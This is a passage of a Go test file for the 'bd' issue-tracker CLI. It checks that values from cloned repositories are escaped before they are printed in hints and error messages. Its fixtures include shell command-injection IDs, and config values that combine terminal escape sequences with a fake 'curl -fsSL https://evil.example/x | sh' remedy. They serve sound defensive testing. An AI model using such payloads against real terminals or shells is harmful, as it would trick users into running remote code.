				"  Start with: bd update {id} --claim{note}\n\n" +
				"💡 Run bd show {id}{note} to see detailed instructions.\n",
			func(t *testing.T, id string) string {
				step := &types.Issue{ID: id, Title: "Step"}
				return printed(t, func() {
					printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: "Mol",
						Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
				})
			}},
		{"bd mol current, current step", "<step-id>",
			"You're working on molecule bd-1\n  Mol\n\n" +
				"  [current] {shown}: Step <- YOU ARE HERE\n\n" +
				"Progress: 0/1 steps complete\n\n" +
				"💡 Run bd show {id}{note} to see detailed instructions.\n",
			func(t *testing.T, id string) string {
				step := &types.Issue{ID: id, Title: "Step"}
				return printed(t, func() {
					printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: "Mol",
						Steps: []*StepStatus{{Issue: step, Status: "current", IsCurrent: true}}, CurrentStep: step, Total: 1})
				})
			}},
		{"bd mol current, molecule", "",
			"You're working on molecule {shown}\n  Mol\n\n" +
				"  [ready] bd-1.1: Step\n\n" +
				"Progress: 0/1 steps complete\n\n" +
				"Next ready: bd-1.1 - Step\n" +
				"  Start with: bd update bd-1.1 --claim\n\n" +
				"💡 Run bd show bd-1.1 to see detailed instructions.\n",
			func(t *testing.T, id string) string {
				step := &types.Issue{ID: "bd-1.1", Title: "Step"}
				return printed(t, func() {
					printMoleculeProgress(&MoleculeProgress{MoleculeID: id, MoleculeTitle: "Mol",
						Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
				})
			}},
		{"bd mol current, large molecule", "<molecule-id>",
			"Molecule: {shown}\n  Mol\n\n" +
				"Progress: 0 / 150 steps (0.0%)\n\n" + largeNote +
				"  bd mol current {id} --limit 50        # First 50 steps\n" +
				"  bd mol current {id} --range 1-50     # Steps 1-50\n" +
				"  bd mol progress {id}                 # Efficient progress summary{noteline}\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: id, MoleculeTitle: "Mol", Total: 150})
				})
			}},
		{"bd mol current, large molecule's current step", "<step-id>",
			"Molecule: bd-1\n  Mol\n\n" +
				"Progress: 0 / 150 steps (0.0%)\n" +
				"Current step: {shown}\n\n" + largeNote +
				"  bd mol current bd-1 --limit 50        # First 50 steps\n" +
				"  bd mol current bd-1 --range 1-50     # Steps 1-50\n" +
				"  bd mol progress bd-1                 # Efficient progress summary\n\n" +
				"💡 Run bd show {id}{note} to see detailed instructions.\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: "bd-1", MoleculeTitle: "Mol", Total: 150, CurrentStepID: id})
				})
			}},
		{"bd mol stale", "<molecule-id>",
			"ℹ Molecules with all children closed (review scope before closing):\n\n" +
				"  {shown}  Mol  (1/1)\n" +
				"       → Close with: bd close {id}{note}\n\n" +
				"Total: 1 stale\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: id, Title: "Mol", TotalChildren: 1, ClosedChildren: 1}}, TotalCount: 1}, false)
				})
			}},
		{"bd mol stale --blocking", "<molecule-id>",
			"⚠ Molecules with all children closed (review scope; blocking work):\n\n" +
				"  {shown}  Mol  (1/1) [blocking 1]\n" +
				"       → Close with: bd close {id}{note}\n" +
				"       → Blocking: [bd-1]\n\n" +
				"Total: 1 stale, 1 blocking other work\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: id, Title: "Mol", TotalChildren: 1, ClosedChildren: 1,
						BlockingIssues: []string{"bd-1"}, BlockingCount: 1}}, TotalCount: 1, BlockingCount: 1}, true)
				})
			}},
		{"bd mol stale --blocking, blocked issue", "",
			"⚠ Molecules with all children closed (review scope; blocking work):\n\n" +
				"  bd-1  Mol  (1/1) [blocking 2]\n" +
				"       → Close with: bd close bd-1\n" +
				"       → Blocking: [{shown} bd-3]\n\n" +
				"Total: 1 stale, 1 blocking other work\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: "Mol", TotalChildren: 1, ClosedChildren: 1,
						BlockingIssues: []string{id, "bd-3"}, BlockingCount: 2}}, TotalCount: 1, BlockingCount: 1}, true)
				})
			}},
		{"bd close --continue, next step", "<step-id>",
			"\nNext ready in molecule:\n" +
				"  {shown}: Step\n\n" +
				"Start with: bd update {id} --claim{note}\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: id, Title: "Step"}})
				})
			}},
		{"bd close --continue --suggest-next, next step", "<step-id>",
			"\nNewly unblocked:\n" +
				"  • {shown} — Step (P1)\n" +
				"\nNext ready in molecule:\n" +
				"  {shown}: Step\n\n" +
				"Start with: bd update {id} --claim{note}\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					printNewlyUnblocked([]*types.Issue{{ID: id, Title: "Step", Priority: 1}})
					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: id, Title: "Step"}})
				})
			}},
		{"bd close --continue, molecule complete", "<molecule-id>",
			"✓ Auto-closed completed molecule {shown} — Mol\n" +
				"\n✓ Molecule {shown} complete! All steps closed.\n" +
				"Consider: bd mol squash {id} --summary '...'{note}\n",
			func(t *testing.T, id string) string {
				return printed(t, func() {
					reportMoleculeAutoClose(&types.Issue{ID: id, Title: "Mol"}, "")
					PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, MolComplete: true, MoleculeID: id})
				})
			}},
	} {
		// Each ID is named shown on the lines around a command: escaped,
		// unless it is a plain word, with its $ spelled \x24, its backtick
		// \x60, its ; \x3b and its line feed \n. An ID that holds shell
		// syntax but prints as itself goes into a command single-quoted on
		// POSIX (quoted). The backtick ID is the one that ran its ;-separated
		// command when bd mol current put bd show between backticks.
		for _, id := range []struct {
			value, shown string
			quoted       bool
		}{
			{"bd-2.1", "bd-2.1", false},
			{"bd-x$(touch${IFS}pwned)", `"bd-x\x24(touch\x24{IFS}pwned)"`, true},
			{"bd-x`;touch pwned;`", `"bd-x\x60\x3btouch pwned\x3b\x60"`, true},
			{"bd-x\necho pwned #", `"bd-x\necho pwned #"`, false},
			{hostileName, remedy.EscapedValue(hostileName), false},
		} {
			t.Run(tc.name+"/"+strconv.Quote(id.value), func(t *testing.T) {
				// On Windows no quoting passes a $ or a backtick on
				// unchanged, so the command takes the placeholder there too.
				spelled, note := id.value, ""
				switch {
				case id.quoted && runtime.GOOS != "windows":
					spelled = "'" + id.value + "'"
				case id.value != "bd-2.1":
					spelled, note = tc.placeholder, "  ("+tc.placeholder+": "+id.shown+")"
				}
				noteLine := ""
				if note != "" {
					noteLine = "\n" + note
				}
				want := strings.NewReplacer("{id}", spelled, "{noteline}", noteLine, "{note}", note, "{shown}", id.shown).Replace(tc.want)
				got := tc.hint(t, id.value)
				if got != want {
					t.Errorf("%s prints\n%q\nwant\n%q", tc.name, got, want)
				}
				requireNoTerminalControl(t, tc.name, got)
				// sh, bash and zsh run a pasted `...` as a command
				// substitution, which a backtick in the quoted ID would end,
				// so the only backticks printed are the ID's own.
				if strings.Contains(strings.ReplaceAll(got, spelled, ""), "`") {
					t.Errorf("%s prints a backtick outside the quoted ID:\n%q", tc.name, got)
				}
			})
		}
	}
}

// TestStoreReadHintsNameTitlesEscaped pins the other values the printers of
// TestStoreReadIDHintsQuoteIDs read from the store: a title, an assignee and
// a status are each spelled by remedy.PrintedValue, so a carriage return or
// terminal escape in one cannot redraw a hint printed above or below it, and
// the value is still named. So is the refusal bd close prints when a
// completed molecule's root refuses its auto-close, whose sentence names the
// root.
func TestStoreReadHintsNameTitlesEscaped(t *testing.T) {
	// bd close names an issue with its title, as output.title-length's
	// default lets it.
	initConfigForTest(t)
	for _, tc := range []struct {
		name string
		run  func()
	}{
		{"bd duplicates", func() {
			group := []*types.Issue{{ID: "bd-1", Title: hostileName, Status: types.Status(hostileName)}, {ID: "bd-2", Title: hostileName, Status: types.StatusOpen}}
			_ = outputDuplicates([][]*types.Issue{group}, map[string]int{}, map[string]*issueScore{"bd-1": {dependentCount: 1}}, false, false, nil)
		}},
		{"bd mol current", func() {
			step := &types.Issue{ID: "bd-1.1", Title: hostileName}
			printMoleculeProgress(&MoleculeProgress{MoleculeID: "bd-1", MoleculeTitle: hostileName, Assignee: hostileName,
				Steps: []*StepStatus{{Issue: step, Status: "ready"}}, NextStep: step, Total: 1})
		}},
		{"bd mol current, large molecule", func() {
			printLargeMoleculeSummary(&types.MoleculeProgressStats{MoleculeID: "bd-1", MoleculeTitle: hostileName, Total: 150, CurrentStepID: "bd-1.1"})
		}},
		{"bd mol stale", func() {
			renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: hostileName, TotalChildren: 1, ClosedChildren: 1}}, TotalCount: 1}, false)
		}},
		{"bd mol stale --blocking", func() {
			renderStaleResult(&StaleResult{StaleMolecules: []*StaleMolecule{{ID: "bd-1", Title: hostileName, TotalChildren: 1, ClosedChildren: 1,
				BlockingIssues: []string{"bd-2"}, BlockingCount: 1}}, TotalCount: 1, BlockingCount: 1}, true)
		}},
		{"bd close --continue", func() {
			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1"}, NextStep: &types.Issue{ID: "bd-1.2", Title: hostileName}})
		}},
		{"bd close --continue --suggest-next", func() {
			printNewlyUnblocked([]*types.Issue{{ID: "bd-1.2", Title: hostileName, Priority: 1}})
			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1.1"}, NextStep: &types.Issue{ID: "bd-1.2", Title: "Step"}})
		}},
		{"bd close --continue, molecule complete", func() {
			reportMoleculeAutoClose(&types.Issue{ID: "bd-1", Title: hostileName}, "")
			PrintContinueResult(&ContinueResult{ClosedStep: &types.Issue{ID: "bd-1.1"}, MolComplete: true, MoleculeID: "bd-1"})
		}},
		{"bd find-duplicates", func() {
			_ = reportFindDuplicates(context.Background(), []*types.Issue{
				{ID: "bd-1", Title: hostileName, Description: "one identical body of text", Status: types.StatusOpen},
				{ID: "bd-2", Title: hostileName, Description: "one identical body of text", Status: types.StatusOpen},
			}, "mechanical", 0.1, 0, "")
		}},
		{"bd mol ready --gated", func() {
			_ = renderGatedReadyMolecules([]*GatedMolecule{{MoleculeID: "bd-1", MoleculeTitle: hostileName,
				ReadyStep: &types.Issue{ID: "bd-1.1", Title: hostileName}}})
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			out := captureStdout(t, func() error {
				tc.run()
				return nil
			})
			requireNoTerminalControl(t, tc.name, out)
			requireNamesHostileValue(t, tc.name, out)
		})
	}
	// The refusal is printed on stderr, in the Auto-closed line's place, and
	// an ordinary one prints as it is.
	t.Run("bd close --continue, refused auto-close", func(t *testing.T) {
		warning := func(root string) string {
			refusal := (&issueops.CloseNotAssigneeError{IssueID: root, Assignee: "alice", Actor: "bob"}).Error()
			return captureStderr(t, func() { reportMoleculeAutoClose(nil, refusal) })
		}
		want := `Warning: could not auto-close completed molecule: cannot close bd-1: assignee is "alice", actor is "bob"; reclaim or use --force to override` + "\n"
		if got := warning("bd-1"); got != want {
			t.Errorf("bd close warns\n%q\nwant\n%q", got, want)
		}
		out := warning(hostileName)
		requireNoTerminalControl(t, "bd close's auto-close refusal", out)
		requireNamesHostileValue(t, "bd close's auto-close refusal", out)
	})
}

// TestRemedyPrintersKeepBdsOwnLines pins the routed open and create
// refusals that wrap an error bd composed (a server-mode open's auto-start
// failure, with its advice on lines of its own): the wrapped error is
// reported line for line, not quoted onto one line.
func TestRemedyPrintersKeepBdsOwnLines(t *testing.T) {
	cause := errors.New(notInstalledError)
	for _, tc := range []struct {
		name string
		out  func() string
	}{
		{"bd create --repo target store open failure", func() string {
			return captureStderr(t, func() {
				_ = handleCreateTargetStoreError(cause, "/tmp/target", "failed to open target store: %v")
			})
		}},
		{"bd create --repo target initialization failure", func() string {
			return captureStderr(t, func() { _ = handleRepoTargetInitError("/tmp/target", cause) })
		}},
		{"bd migrate-personal planning store open failure", func() string {
			return planningOpenError("/tmp/planning", cause).Error()
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if out := tc.out(); !strings.Contains(out, notInstalledError) {
				t.Errorf("the open error is not reported as bd wrote it:\n%s", out)
			}
		})
	}
}

// TestCreateTargetMessagesQuoteOrdinaryPaths pins that a routed bd create's
// capability refusals name an ordinary target path in double quotes, as main
// spelled it with %q, while still escaping what a terminal acts on.
func TestCreateTargetMessagesQuoteOrdinaryPaths(t *testing.T) {
	for _, code := range []string{"proxy.store.refused", "proxy.store.unrouted"} {
		t.Run(code, func(t *testing.T) {
			out := captureStderr(t, func() {
				_ = handleCreateTargetStoreError(&ProxyCapabilityError{Code: code, Message: "refused"}, "/home/me/my repo", "%v")
			})
			if !strings.Contains(out, `create target "/home/me/my repo"`) {
				t.Errorf("the target path is not named in double quotes:\n%s", out)
			}
		})
	}
}

// remedyGuardedFuncs names, per file, the functions whose messages name a
// clone-supplied path, database, table or issue ID beside a remedy: every
// function of migrate_personal.go, and the routed-create target functions of
// create.go. "*" is every function in the file.
var remedyGuardedFuncs = map[string][]string{
	"migrate_personal.go": {"*"},
	"create.go": {
		"handleCreateTargetStoreError", "openDryRunTargetStore", "handleRepoTargetInitError",
		"ensureBeadsDirForPath", "refuseUninitializableTarget", "serverInitRemedy",
		"adoptTargetDatabase", "refuseUncommittedTargetChanges",
	},
	// The open of a routed planning or target store (bd migrate-personal,
	// bd create --repo, auto-routing).
	"store_factory.go":          {"openDoltStoreFromConfig", "errNoRoutedEmbeddedDatabase"},
	"workspace_format_guard.go": {"handleWorkspaceGuardError"},
}

// remedyTaintedNames are the variables and fields those functions hold a
// clone-supplied value in, and remedyTaintedCalls the calls that derive or
// read one.
var (
	remedyTaintedNames = map[string]bool{
		"planningPath": true, "planningRaw": true, "planningRepo": true, "planningBeadsDir": true,
		"targetRepo": true, "target": true, "targetPath": true, "repoPath": true,
		"beadsDir": true, "repo": true, "where": true, "host": true,
		"tables": true, "databases": true, "created": true, "ids": true,
		"ID": true, "SourceRepo": true, "ProjectID": true, "TargetDir": true,
	}
	remedyTaintedCalls = map[string]bool{
		"filepath.Dir": true, "filepath.Join": true, "filepath.Base": true,
		"strings.Join": true, "embeddeddolt.Databases": true,
		"configfile.ConfigPath": true, "configfile.MetadataFilePath": true,
	}
	// remedyPrintCalls are the calls whose arguments reach the terminal.
	remedyPrintCalls = map[string]bool{
		"fmt.Errorf": true, "fmt.Sprintf": true, "fmt.Printf": true, "fmt.Fprintf": true,
		"fmt.Println": true, "fmt.Fprintln": true, "refusePlanningRepo": true, "refuseTarget": true,
		"HandleError": true, "HandleErrorRespectJSON": true, "HandleErrorWithHint": true,
	}
)

// TestRemedyRefusalsDoNotInterpolateRawPaths is the census half of the
// remedy-printing invariant (TestRemedyRefusalsNameValuesEscaped is the
// behavioral half): in the guarded functions, a clone-supplied value reaches
// a print call only through the remedy printer (a remedy.* call), or through
// a variable that function assigned from one. %q is rejected too, so every
// guarded site goes through the one printer. This test does not check which
// remedy call a site uses: a value that may be pasted is protected by
// CommandArg or EscapedValue, not by PrintedValue, which prints a printable
// value bare. A new refusal that formats planningPath, a target path, a
// database list or an issue ID bare fails here.
func TestRemedyRefusalsDoNotInterpolateRawPaths(t *testing.T) {
	t.Parallel()
	callName := func(call *ast.CallExpr) string {
		switch fn := call.Fun.(type) {
		case *ast.Ident:
			return fn.Name
		case *ast.SelectorExpr:
			if pkg, ok := fn.X.(*ast.Ident); ok {
				return pkg.Name + "." + fn.Sel.Name
			}
		}
		return ""
	}
	isRemedyCall := func(n ast.Node) bool {
		call, ok := n.(*ast.CallExpr)
		return ok && strings.HasPrefix(callName(call), "remedy.")
	}
	for file, funcs := range remedyGuardedFuncs {
		fset := token.NewFileSet()
		parsed, err := parser.ParseFile(fset, file, nil, 0)
		if err != nil {
			t.Fatalf("parse %s: %v", file, err)
		}
		seen := map[string]bool{}
		for _, decl := range parsed.Decls {
			fn, ok := decl.(*ast.FuncDecl)
			if !ok || fn.Body == nil || (funcs[0] != "*" && !slices.Contains(funcs, fn.Name.Name)) {
				continue
			}
			seen[fn.Name.Name] = true
			// printed holds the variables this function assigns only from the
			// printer, or from a print call whose own arguments are checked.
			printed := map[string]bool{}
			ast.Inspect(fn.Body, func(n ast.Node) bool {
				assign, ok := n.(*ast.AssignStmt)
				if !ok {
					return true
				}
				for i, lhs := range assign.Lhs {
					ident, ok := lhs.(*ast.Ident)
					if !ok || i >= len(assign.Rhs) {
						continue
					}
					call, isCall := assign.Rhs[i].(*ast.CallExpr)
					if isCall && (isRemedyCall(call) || remedyPrintCalls[callName(call)]) {
						if _, seenBefore := printed[ident.Name]; !seenBefore {
							printed[ident.Name] = true
						}
						continue
					}
					printed[ident.Name] = false
				}
				return true
			})
			ast.Inspect(fn.Body, func(n ast.Node) bool {
				call, ok := n.(*ast.CallExpr)
				if !ok || !remedyPrintCalls[callName(call)] {
					return true
				}
				for _, arg := range call.Args {
					ast.Inspect(arg, func(n ast.Node) bool {
						if isRemedyCall(n) {
							return false
						}
						var name string
						switch x := n.(type) {
						case *ast.CallExpr:
							name := callName(x)
							if remedyTaintedCalls[name] {
								t.Errorf("%s: %s formats %s without the remedy printer (internal/remedy)", fset.Position(x.Pos()), fn.Name.Name, name)
								return false
							}
							// A ui render wrapper prints its argument; any
							// other call computes a value of its own (a
							// count, a port), and a nested print call is
							// checked on its own.
							return strings.HasPrefix(name, "ui.")
						case *ast.SelectorExpr:
							name = x.Sel.Name
						case *ast.Ident:
							name = x.Name
						default:
							return true
						}
						if remedyTaintedNames[name] && !printed[name] {
							t.Errorf("%s: %s formats %s without the remedy printer (internal/remedy)", fset.Position(n.Pos()), fn.Name.Name, name)
							return false
						}
						return true
					})
				}
				return true
			})
		}
		for _, name := range funcs {
			if name != "*" && !seen[name] {
				t.Errorf("%s has no function %s; update remedyGuardedFuncs", file, name)
			}
		}
	}
}

// hostilePlanningRepo makes an initialized planning repo whose directory name
// is hostileFileName and points dir's routing.contributor at it, as a
// committed config.yaml can.
func hostilePlanningRepo(t *testing.T, bd, dir string) string {
	t.Helper()
	planningDir := filepath.Join(t.TempDir(), hostileFileName)
	if err := os.MkdirAll(planningDir, 0o750); err != nil {
		t.Fatal(err)
	}
	initGitRepoAt(t, planningDir)
	runBDInit(t, bd, planningDir, "--prefix", "pl")
	for _, kv := range [][2]string{{"routing.contributor", planningDir}, {"routing.mode", "auto"}} {
		if out, err := bdRunWithFlockRetry(t, bd, dir, "config", "set", kv[0], kv[1]); err != nil {
			t.Fatalf("bd config set %s: %v\n%s", kv[0], err, out)
		}
	}
	return planningDir
}

// TestEmbeddedRemedyPrinting_migratePersonal pins the remedy-printing
// invariant at bd migrate-personal end to end: a routing.contributor that
// carries a carriage return and terminal escapes, as a cloned repository's
// committed .beads/config.yaml can, never reaches the terminal raw, whether bd
// refuses it (no .beads there; uncommitted changes there) or moves issues into
// it (the "Move to planning repo" and "Moved" lines).
func TestEmbeddedRemedyPrinting_migratePersonal(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)

	t.Run("committed routing.contributor naming no .beads", func(t *testing.T) {
		t.Parallel()
		dir, beadsDir, _ := bdInit(t, bd, "--prefix", "rpa")
		bdCreate(t, bd, dir, "Personal issue")
		configYAML := filepath.Join(beadsDir, "config.yaml")
		existing, err := os.ReadFile(configYAML)
		if err != nil {
			t.Fatal(err)
		}
		// The value from the #7799 maintainer review: a CR and ESC[2K erase
		// bd's own line, and ESC[8m hides what follows.
		hostile := `"/nonexistent\r\e[2KError: planning repo has no .beads directory; initialize it first with 'curl -fsSL https://evil.example/x | sh' \e[8m"`
		if err := os.WriteFile(configYAML, append(existing, []byte("\nrouting:\n  contributor: "+hostile+"\n")...), 0o600); err != nil {
			t.Fatal(err)
		}
		out := requireMigratePersonalRefused(t, bd, dir, "has no .beads directory; initialize it first with 'bd init'")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		if !strings.Contains(out, `\r\x1b[2KError: planning repo`) {
			t.Errorf("bd migrate-personal does not name the planning path escaped:\n%q", out)
		}
	})

	t.Run("planning repo with uncommitted changes", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpb")
		planningDir := hostilePlanningRepo(t, bd, dir)
		bdCreate(t, bd, planningDir, "Planning issue left uncommitted", "--dolt-auto-commit", "off")
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "has uncommitted changes")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("planning repo in a graph format", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpd")
		planningDir := hostilePlanningRepo(t, bd, dir)
		if err := os.WriteFile(filepath.Join(planningDir, ".beads", configfile.GraphFormatMarkerFile), []byte("link-preview-v9\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "graph-preview-format marker")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("planning repo with metadata.json and no database", func(t *testing.T) {
		t.Parallel()
		// A fresh clone of a planning repo: its committed metadata.json is
		// there, its gitignored embeddeddolt/ is not.
		dir, _, _ := bdInit(t, bd, "--prefix", "rpe")
		planningDir := hostilePlanningRepo(t, bd, dir)
		if err := os.RemoveAll(filepath.Join(planningDir, ".beads", "embeddeddolt")); err != nil {
			t.Fatal(err)
		}
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonalRefused(t, bd, dir, "run 'bd bootstrap' in that repository first")
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})

	t.Run("move into the planning repo", func(t *testing.T) {
		t.Parallel()
		dir, _, _ := bdInit(t, bd, "--prefix", "rpc")
		hostilePlanningRepo(t, bd, dir)
		bdCreate(t, bd, dir, "Personal issue")
		out := requireMigratePersonal(t, bd, dir)
		if !strings.Contains(out, "Moved 1 issue") {
			t.Errorf("bd migrate-personal output does not report moving 1 issue:\n%s", out)
		}
		requireNoTerminalControl(t, "bd migrate-personal", out)
		requireNamesHostileValue(t, "bd migrate-personal", out)
	})
}

// TestEmbeddedRemedyPrinting_createTarget pins the invariant at a routed bd
// create: a target whose directory name and database table names carry a
// carriage return and terminal escapes is refused with them escaped beside the
// bd dolt commit remedy.
func TestEmbeddedRemedyPrinting_createTarget(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "rpt")

	t.Run("target in a graph format", func(t *testing.T) {
		t.Parallel()
		targetDir := filepath.Join(t.TempDir(), hostileFileName)
		if err := os.MkdirAll(filepath.Join(targetDir, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(targetDir, ".beads", configfile.GraphFormatMarkerFile), []byte("link-preview-v9\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		out := bdCreateFail(t, bd, dir, "--silent", "Routed into a graph target", "--repo", targetDir)
		if !strings.Contains(out, "graph-preview-format marker") {
			t.Errorf("bd create --repo did not refuse the graph-format target:\n%s", out)
		}
		requireNoTerminalControl(t, "bd create --repo", out)
		requireNamesHostileValue(t, "bd create --repo", out)
	})

	targetDir := filepath.Join(t.TempDir(), hostileFileName)
	if err := os.MkdirAll(targetDir, 0o750); err != nil {
		t.Fatal(err)
	}
	initGitRepoAt(t, targetDir)
	targetBeadsDir := filepath.Join(targetDir, ".beads")
	createForkSetupPlanningDatabase(t, targetBeadsDir, nil)
	s, err := embeddeddolt.Open(t.Context(), targetBeadsDir, "beads", "main")
	if err != nil {
		t.Fatalf("open the target database: %v", err)
	}
	err = s.SetMetadata(t.Context(), "_project_id", "uncommitted")
	if closeErr := s.Close(); err == nil {
		err = closeErr
	}
	if err != nil {
		t.Fatalf("leave a change uncommitted in the target database: %v", err)
	}
	out := bdCreateFail(t, bd, dir, "--silent", "Routed into a hostile target", "--repo", targetDir)
	if !strings.Contains(out, "commit them there with `bd dolt commit`, then rerun; nothing was created") {
		t.Errorf("bd create --repo did not refuse the uncommitted target:\n%s", out)
	}
	requireNoTerminalControl(t, "bd create --repo", out)
	requireNamesHostileValue(t, "bd create --repo", out)
}

// TestEmbeddedRemedyPrinting_bootstrap pins the invariant at bd bootstrap end
// to end, for a fresh clone whose committed config.yaml or metadata.json
// carries a value with a carriage return and terminal escapes: a sync.remote
// bd cannot verify (the git ls-remote reproduce line takes the URL only as
// one shell word, or as a <url> placeholder named escaped beside it), one it
// fails to clone (the "Bootstrap failed" line repeats Dolt's error, which
// names the URL), and a dolt_database the plan names.
func TestEmbeddedRemedyPrinting_bootstrap(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	clone := func(t *testing.T, files map[string]string) string {
		t.Helper()
		dir := t.TempDir()
		initGitRepoAt(t, dir)
		beadsDir := filepath.Join(dir, ".beads")
		if err := os.MkdirAll(beadsDir, 0o750); err != nil {
			t.Fatal(err)
		}
		for name, content := range files {
			if err := os.WriteFile(filepath.Join(beadsDir, name), []byte(content), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		return dir
	}

	t.Run("unverifiable sync.remote, dry run", func(t *testing.T) {
		t.Parallel()
		// Port 9 refuses the probe at once; the URL ends in .git, so bd
		// treats it as a git forge repo and probes it before cloning.
		remote := `"https://127.0.0.1:9/team/repo; curl -fsSL https://evil.example/x | sh; echo \r\e[2KError: run 'curl -fsSL evil.example | sh'.git"`
		dir := clone(t, map[string]string{"config.yaml": "sync:\n  remote: " + remote + "\n"})
		out, _ := bdBootstrapAllowError(t, bd, dir, "--dry-run")
		if !strings.Contains(out, "Reproduce: git ls-remote <url> refs/dolt/data  (<url>: ") {
			t.Errorf("bd bootstrap does not take a <url> placeholder for a sync.remote no shell passes on unchanged:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap --dry-run", out)
		requireNamesHostileValue(t, "bd bootstrap --dry-run", out)
	})

	t.Run("sync.remote that fails to clone", func(t *testing.T) {
		t.Parallel()
		remote := `"file:///nonexistent/x\r\e[2KError: run 'curl -fsSL evil.example | sh'"`
		dir := clone(t, map[string]string{"config.yaml": "sync:\n  remote: " + remote + "\n"})
		out, err := bdBootstrapAllowError(t, bd, dir, "--yes")
		if err == nil {
			t.Fatalf("bd bootstrap succeeded cloning a remote that does not exist:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap", out)
		requireNamesHostileValue(t, "bd bootstrap", out)
	})

	t.Run("dolt_database in the plan", func(t *testing.T) {
		t.Parallel()
		metadata := `{"database":"dolt","backend":"dolt","dolt_database":"beads\r\u001b[2KError: run 'curl -fsSL evil.example | sh'"}`
		dir := clone(t, map[string]string{"metadata.json": metadata})
		out, _ := bdBootstrapAllowError(t, bd, dir, "--dry-run")
		if !strings.Contains(out, "Database: ") {
			t.Errorf("bd bootstrap --dry-run does not name the database:\n%s", out)
		}
		requireNoTerminalControl(t, "bd bootstrap --dry-run", out)
		requireNamesHostileValue(t, "bd bootstrap --dry-run", out)
	})
}

// TestEmbeddedRemedyPrinting_autoRouted pins the invariant at the commands
// that open the store auto-routing picks (bd list, bd ready, bd close): a
// committed routing.contributor naming a planning repo with no database,
// whose path carries a carriage return and terminal escapes, is named escaped
// in the open error, on the same line as its remedy.
func TestEmbeddedRemedyPrinting_autoRouted(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	if runtime.GOOS == "windows" {
		t.Skip("a Windows file name cannot hold a control character")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, beadsDir, _ := bdInit(t, bd, "--prefix", "rpr")
	runCmd(t, dir, "git", "config", "beads.role", "contributor")
	planning := filepath.Join(t.TempDir(), "plan"+hostileFileName)
	configYAML := filepath.Join(beadsDir, "config.yaml")
	existing, err := os.ReadFile(configYAML)
	if err != nil {
		t.Fatal(err)
	}
	routingYAML := "\nrouting:\n  mode: auto\n  contributor: " + strconv.Quote(planning) + "\n"
	if err := os.WriteFile(configYAML, append(existing, []byte(routingYAML)...), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"list"}, {"ready"}, {"close", "pl-abc"}} {
		t.Run(strings.Join(args, " "), func(t *testing.T) {
			out, _ := bdRunWithFlockRetry(t, bd, dir, args...)
